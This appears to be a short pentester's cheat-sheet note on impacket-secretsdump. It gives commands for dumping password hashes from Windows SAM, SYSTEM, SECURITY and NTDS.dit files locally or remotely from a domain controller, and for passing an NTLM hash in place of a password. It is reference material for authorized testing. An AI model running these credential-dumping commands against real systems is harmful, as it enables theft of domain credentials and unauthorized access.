For dumping sam, system, security, and NTDS.dit files

`impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS LOCAL`
	can also authenticate to system instead of dumping locally
	-h for details

if using -hashes, format is LMHASH:NTHASH. you can just provide the NTLM hash like this
	`:<NTLM_HASH>`




```
# locally

impacket-secretsdump -sam <SAM> -system <SYSTEM> -security <SECURITY> -ntds <NTDS.dit> LOCAL

# Remotely

impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY -ntds NTDS -dc-ip <dc_ip> '<domain>'/'<username>':'<password>'@<target>

```